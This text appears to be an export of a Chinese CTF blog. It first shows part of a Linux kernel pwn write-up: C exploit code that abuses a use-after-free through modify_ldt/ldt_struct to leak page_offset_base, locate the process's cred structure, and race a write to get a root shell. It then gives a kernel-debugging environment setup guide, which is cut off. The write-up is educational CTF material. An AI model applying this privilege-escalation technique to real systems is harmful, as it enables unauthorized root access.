<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> retVal = <span class="number">0</span>;</span><br><span class="line">alloc_entry(<span class="number">1</span>);</span><br><span class="line">set_note(<span class="number">1</span>);</span><br><span class="line">free_entry(<span class="number">1</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="type">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    write_note(addr);</span><br><span class="line">    retVal = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (retVal &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    addr += <span class="number">0x200000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n&quot;</span>, addr);</span><br></pre></td></tr></table></figure>

<p>在 user_desc 构造方式上，源码如下，我们需要保证</p>
<ol>
<li>entry_number &lt; LDT_ENTRIES</li>
<li>contents !&#x3D; 3<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
此时会报错，触发panic<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ $ ./poc</span><br><span class="line">[    3.957895] usercopy: Kernel memory exposure attempt detected from null address (offset 0, size 8)!</span><br><span class="line">[    3.967668] kernel BUG at mm/usercopy.c:99!</span><br><span class="line">[    3.970064] invalid opcode: 0000 [#1] SMP PTI</span><br><span class="line">[    3.970507] CPU: 1 PID: 144 Comm: poc Tainted: G           OE     5.11.9 #2</span><br><span class="line">[    3.970811] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014</span><br><span class="line">[    3.971277] RIP: 0010:usercopy_abort+0x7b/0x7d</span><br><span class="line">[    3.972089] Code: 4c 0f 45 de 51 4c 89 d1 48 c7 c2 dd 8a dc 84 57 48 c7 c6 43 35 db 84 48 c7 c7 a8 8b dc 84 48 0f 45 f2 4c 89 da e8 02 83 ff ff &lt;0f&gt; 0b 4c 89 e1 49 89 d8 44 89 ea 31 f6 48 29 c1 48 c7 c7 1f 8b dc</span><br><span class="line">[    3.972842] RSP: 0018:ffffa1ad401cbe90 EFLAGS: 00000246</span><br><span class="line">[    3.973328] RAX: 0000000000000057 RBX: 0000000000000008 RCX: c0000000ffffdfff</span><br><span class="line">[    3.973538] RDX: 0000000000000000 RSI: 00000000ffffdfff RDI: 0000000000000246</span><br><span class="line">[    3.973880] RBP: ffffa1ad401cbea8 R08: 0000000000000000 R09: ffffa1ad401cbc68</span><br><span class="line">[    3.974093] R10: 0000000000000001 R11: 0000000000000001 R12: 0000000000000000</span><br><span class="line">[    3.974354] R13: 0000000000000001 R14: 0000000000000008 R15: 0000000000000008</span><br><span class="line">[    3.974590] FS:  000000000169d880(0000) GS:ffff911a87a80000(0000) knlGS:0000000000000000</span><br><span class="line">[    3.974972] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[    3.975190] CR2: ffffffffc0000000 CR3: 000000000293c000 CR4: 00000000003006e0</span><br><span class="line">[    3.975561] Call Trace:</span><br><span class="line">[    3.976301]  __check_object_size.cold+0x5d/0x7b</span><br><span class="line">[    3.976651]  read_ldt+0x89/0xf0</span><br><span class="line">[    3.976752]  __x64_sys_modify_ldt+0x5c/0x90</span><br><span class="line">[    3.976862]  do_syscall_64+0x38/0x90</span><br><span class="line">[    3.977055]  entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br></pre></td></tr></table></figure>
对 <code>__check_object_size</code> 进行分析，源码如下:<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Validates that the given object is:</span></span><br><span class="line"><span class="comment"> * - not bogus address</span></span><br><span class="line"><span class="comment"> * - fully contained by stack (or stack frame, when available)</span></span><br><span class="line"><span class="comment"> * - fully within SLAB object (or object whitelist area, when available)</span></span><br><span class="line"><span class="comment"> * - not in kernel text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">    check_bogus_address((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">    check_stack_object(ptr, n);</span><br><span class="line">    check_heap_object(ptr, n, to_user);</span><br><span class="line">    check_kernel_text_object((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
无法直接获取 kernel text 基址，则考虑从物理内存的直接映射地址进行搜索寻找页偏移基址<blockquote>
<p>Start addr    |   Offset   |     End addr     |  Size   | VM area description<br>ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</p>
</blockquote>
</li>
</ol>
<p>由于物理内存直接映射区很大，所以可以提高步长，我们选择 4000000</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ $ ./poc</span><br><span class="line">[+] Found page_offset_base: ffff9f1080000000</span><br></pre></td></tr></table></figure>

<ul>
<li>控制 cred 结构体</li>
</ul>
<p>虽然获得了页地址，但是在之后搜索 <code>task_struct</code> 的过程中仍可能会陷入到 check_object_size 报错</p>
<p>而在 fork 调用链中，会调用 <code>ldt_dup_context</code>，源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">	<span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	……</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">	       new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">  </span><br><span class="line">	……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到父进程会把调用 memcpy 函数将 ldt-&gt;entries 复制给子进程，这将不会触发 kernel panic，因此如果要获取 task_struct 结构，步骤如下：</p>
<ol>
<li>使用 UAF 修改父进程中的 ldt-&gt;entries, 并将其指向要搜索的地址，即 页偏移</li>
<li>fork 子进程将 ldt-&gt;entries 进行复制</li>
<li>在子进程内对 ldt-&gt;entries 进行搜索，并返回结果</li>
</ol>
<p>每一个进程对应内核中的一个 task_struct 结构，重要源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="type">pid_t</span>				pid;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * executable name, excluding path.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">    * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">    * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
<p>这里的 comm 是指可执行文件的名称，我们进行简单测试<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205121542628.png"></p>
<p>如果能通过搜索进程的 comm 字段，我们也能通过偏移获取 cred 结构以及进程的 pid</p>
<p>通过 <code>prntl()</code> 函数能够使得进程对自己的 comm 名称进行修改</p>
<p>因此获取进程 pid 和 cred 结构体的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;emiyada&quot;</span>);</span><br><span class="line"><span class="type">int</span> pid = getpid();</span><br><span class="line"><span class="type">int</span> pipefd[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">pipe(pipefd);</span><br><span class="line"><span class="type">char</span> *buf = (<span class="type">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> PAGE_OFFSET=addr;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    addr+=<span class="number">8000</span>;</span><br><span class="line">    write_note(addr);</span><br><span class="line">    <span class="type">int</span> ret = fork();</span><br><span class="line">    <span class="keyword">if</span> (!ret)&#123;</span><br><span class="line">        ret = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> *search = (<span class="type">unsigned</span> <span class="type">long</span> *) buf;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span> ) search &lt; (<span class="type">unsigned</span> <span class="type">long</span>) buf+<span class="number">0x8000</span>)&#123;</span><br><span class="line">            search = memmem(search, (<span class="type">unsigned</span> <span class="type">long</span>)buf+<span class="number">0x8000</span>- (<span class="type">unsigned</span> <span class="type">long</span>) search, <span class="string">&quot;emiyada&quot;</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span> (search == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ((search[<span class="number">-2</span>] &gt; PAGE_OFFSET) &amp;&amp; (search[<span class="number">-3</span>] &gt; PAGE_OFFSET) &amp;&amp; (<span class="type">int</span>) search[<span class="number">-58</span>]==pid)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Found cred : %llx\n&quot;</span>, search[<span class="number">-2</span>]);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Found pid : %d\n&quot;</span>, search[<span class="number">-58</span>]);</span><br><span class="line">                ans = search[<span class="number">-2</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            search+=<span class="number">12</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipefd[<span class="number">1</span>], &amp;ans, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipefd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (cred_addr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ $ ./poc</span><br><span class="line">[+] Found page_offset_base: ffff9106c0000000</span><br><span class="line">Found cred : ffff9106c192f6c0</span><br><span class="line">Found pid : 143</span><br></pre></td></tr></table></figure>

<ul>
<li>特权提升 1</li>
</ul>
<p>此时我们可以通过任意写进行特权提升操作，这里可以仍旧使用 <code>ldt_struct</code>，从之前 <code>write_ldt</code> 函数中我们可以看到，进行覆盖 <code>old_ldt</code> 操作时会进行 <code>memcpy</code> 处理，如果结构体足够大，则可以延长 copy 的时间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arch/x86/include/uapi/asm/ldt.h</span></span><br><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES	8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE	8</span></span><br></pre></td></tr></table></figure>
<p>所以通过 double fetch 进行提权，步骤如下：</p>
<ol>
<li>将 cred 结构体的地址通过 UAF 写在 ldt-&gt;entries 上</li>
<li>通过 <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code> 实现任意写</li>
</ol>
<p>为了提高成功率，将进程绑定在单个 CPU 上，提权代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> ret=fork();</span><br><span class="line"><span class="keyword">if</span> (!ret)&#123;</span><br><span class="line">    ret = fork();</span><br><span class="line">    <span class="keyword">if</span> (!ret)&#123;</span><br><span class="line">        <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>,&amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15</span>;i++)&#123;</span><br><span class="line">            alloc_entry(i);</span><br><span class="line">        &#125;</span><br><span class="line">        set_note(<span class="number">11</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">15</span>; i++)&#123;</span><br><span class="line">            free_entry(i);</span><br><span class="line">        &#125;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">1</span>,&amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            write_note(cred_addr+<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>,&amp;cpu_set);</span><br><span class="line">    sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">    udesc.base_addr=<span class="number">0</span>;</span><br><span class="line">    udesc.entry_number=<span class="number">2</span>;</span><br><span class="line">    udesc.limit=<span class="number">0</span>;</span><br><span class="line">    udesc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    udesc.contents=<span class="number">0</span>;</span><br><span class="line">    udesc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    udesc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    udesc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    udesc.useable=<span class="number">0</span>;</span><br><span class="line">    udesc.lm=<span class="number">0</span>;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;udesc,<span class="keyword">sizeof</span>(udesc));</span><br><span class="line">    sleep(<span class="number">114514</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,geteuid());</span><br><span class="line">setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这种特权提升方式有点问题，之前尝试了十来次才成功 root</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel Pwn 环境搭建及基础知识</title>
    <url>/2022/05/05/Kernel-Pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<span id="more"></span>
<p>本文主要参考 <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/">CTF-wiki</a> 和 <a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/">kiprey</a></p>
<h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p><strong>gdb 插件安装</strong><br>调试内核需要优秀的 gdb 插件，现有的插件有 <code>gef</code> <code>pwndbg</code> <code>peda</code>，有师傅推荐 gef，但是我们可以直接全部安装</p>
<p>脚本地址：<a href="https://github.com/apogiatzis/gdb-peda-pwndbg-gef">https://github.com/apogiatzis/gdb-peda-pwndbg-gef</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~ &amp;&amp; git <span class="built_in">clone</span> https://github.com/apogiatzis/gdb-peda-pwndbg-gef.git</span><br><span class="line"><span class="built_in">cd</span> ~/gdb-peda-pwndbg-gef</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
<p>这样就不用考虑以后使用其他插件的问题了</p>
<p><strong>内核配置</strong><br>官方的内核网址：<a href="https://www.kernel.org/category/releases.html">https://www.kernel.org/category/releases.html</a><br>一般选用 Longterm，即长期支持版</p>
<p>国内有很多镜像文件源，上海离中科大比较近，因此我们选用科大源 <a href="https://mirrors.ustc.edu.cn/kernel.org/linux/kernel/">https://mirrors.ustc.edu.cn/kernel.org/linux/kernel/</a></p>
<p>以 <code>linux-5.17.5.tar.xz</code> 为例，可以看到内核的全部文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ wget -c https://mirrors.ustc.edu.cn/kernel.org/linux/kernel/v5.x/linux-5.17.5.tar.xz</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop$ unxz linux-5.17.5.tar.xz </span><br><span class="line">embeded@ubuntu:~/Desktop$ tar -xf linux-5.17.5.tar</span><br><span class="line">embeded@ubuntu:~/Desktop$ <span class="built_in">cd</span> linux-5.17.5/</span><br><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">arch</span>     CREDITS        fs       Kbuild   LICENSES     net      security  virt</span><br><span class="line">block    crypto         include  Kconfig  MAINTAINERS  README   sound</span><br><span class="line">certs    Documentation  init     kernel   Makefile     samples  tools</span><br><span class="line">COPYING  drivers        ipc      lib      mm           scripts  usr</span><br></pre></td></tr></table></figure>

<p><strong>交换文件扩充（可选）</strong><br>由于选择在虚拟机上进行调试，在编译或者其他操作时可能会出现内存爆炸，这里我选择加一个交换空间</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/embeded<span class="comment"># dd if=/dev/zero of=swapfile bs=1M count=5120</span></span><br><span class="line">root@ubuntu:/home/embeded<span class="comment"># mkswap swapfile</span></span><br><span class="line">root@ubuntu:/home/embeded<span class="comment"># chmod 0600 swapfile</span></span><br><span class="line">root@ubuntu:/home/embeded<span class="comment"># swapon swapfile</span></span><br></pre></td></tr></table></figure>

<p><strong>配置编译选项</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install libncurses5-dev</span><br><span class="line">$ sudo apt install flex</span><br><span class="line">$ sudo apt install bison</span><br><span class="line">$ sudo apt install libssl-dev</span><br><span class="line">$ sudo apt install libelf-dev</span><br><span class="line">$ sudo apt install dwarves</span><br><span class="line"></span><br><span class="line">$ make menuconfig</span><br><span class="line"></span><br><span class="line">Kernel Hacking-&gt;Compile-checks and compiler options </span><br><span class="line">-&gt; Compile the kernel with debug info <span class="comment"># 便于调试，一般默认打开</span></span><br><span class="line">Generic Kernel Debugging Instruments</span><br><span class="line">-&gt; KGDB：kernel debugger <span class="comment"># KGDB 调试内核，一般默认打开</span></span><br></pre></td></tr></table></figure>

<p><strong>编译内核</strong><br>编辑内核镜像，建议不要选择太高，根据机器性能而定</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make -j 4 bzImage</span><br><span class="line">...</span><br><span class="line">  AS      <span class="built_in">arch</span>/x86/boot/header.o</span><br><span class="line">  LD      <span class="built_in">arch</span>/x86/boot/setup.elf</span><br><span class="line">  OBJCOPY <span class="built_in">arch</span>/x86/boot/setup.bin</span><br><span class="line">  BUILD   <span class="built_in">arch</span>/x86/boot/bzImage</span><br><span class="line">Kernel: <span class="built_in">arch</span>/x86/boot/bzImage is ready  (<span class="comment">#2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bzImage: 主流 Kernel 镜像格式，适用于较大的 Kernel</span></span><br><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ binwalk ./arch/x86/boot/bzImage</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Microsoft executable, portable (PE)</span><br><span class="line">16588         0x40CC          gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null <span class="built_in">date</span>)</span><br><span class="line">7898753       0x788681        Cisco IOS microcode, <span class="keyword">for</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>:warning: 报错信息 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make[1]: *** No rule to make target &#x27;debian/canonical-certs.pem&#x27;, needed by &#x27;certs/x509_certificate_list&#x27;.  Stop.</span><br><span class="line">make[1]: *** Waiting for unfinished jobs....</span><br><span class="line"></span><br><span class="line">解决办法：直接修改 .config 文件，将 CONFIG_SYSTEM_TRUSTED_KEYS CONFIG_SYSTEM_REVOCATION_KEYS 置空</span><br></pre></td></tr></table></figure>

<p><strong>构建文件系统</strong><br>下载 busybox 源代码，并编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ wget -c https://busybox.net/downloads/busybox-1.35.0.tar.bz2</span><br><span class="line">embeded@ubuntu:~/Desktop$ tar -jxf busybox-1.35.0.tar.bz2</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop$ <span class="built_in">cd</span> busybox-1.35.0/</span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ make menuconfig</span><br><span class="line"></span><br><span class="line">Settings -&gt; Build static binary (no shared libs) <span class="comment"># kernel 不提供 libc</span></span><br><span class="line">关闭 Linux System Utilities -&gt; Support mounting NFS file systems on Linux &lt; 2.6.23 <span class="comment"># 一般默认不打开</span></span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ make -j 4</span><br></pre></td></tr></table></figure>
<p>配置文件系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ make install</span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ <span class="built_in">cd</span> _install</span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ <span class="built_in">mkdir</span> -p proc sys dev etc/init.d </span><br></pre></td></tr></table></figure>
<p>编写挂载脚本 init，设置权限并打包文件系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0/_install$ gedit init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">chmod</span> +x ./init</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0/_install$ find . | cpio -o --format=newc &gt; ../../rootfs.img</span><br></pre></td></tr></table></figure>
<p><strong>启动内核</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ qemu-system-x86_64 -nographic -kernel ./linux-5.17.5/arch/x86/boot/bzImage -initrd ./rootfs.img -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 nokaslr&quot;</span> -smp cores=2,threads=1 -cpu kvm64</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">INIT SCRIPT</span><br><span class="line">Boot took 1.71 seconds</span><br><span class="line">/ $ [    1.718707] tsc: Refined TSC clocksource calibration: 2303.917 MHz</span><br><span class="line">[    1.719573] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2135a96e28b, max_idle_ns: 440795251144 ns</span><br><span class="line">[    1.721389] clocksource: Switched to clocksource tsc</span><br><span class="line"></span><br><span class="line">/ $ </span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">bin      etc      linuxrc  root     sys      usr</span><br><span class="line">dev      init     proc     sbin     tmp</span><br></pre></td></tr></table></figure>
<p>:warning: 这里按照 <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_10">CTF-wiki</a> 的写法我的QEMU跑不起来，将 <code>-m</code> 参数删除，猜测可能是内核版本过高，内存设置不足导致</p>
<h3 id="内核驱动编写与调试"><a href="#内核驱动编写与调试" class="headerlink" title="内核驱动编写与调试"></a>内核驱动编写与调试</h3><p><strong>驱动编写与编译</strong><br>在内核源码目录下构建文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ <span class="built_in">mkdir</span> mydriver</span><br><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ <span class="built_in">cd</span> mydriver/</span><br></pre></td></tr></table></figure>
<p>在目录下构建驱动代码 <code>ko_test.c</code>，原封不动照抄</p>
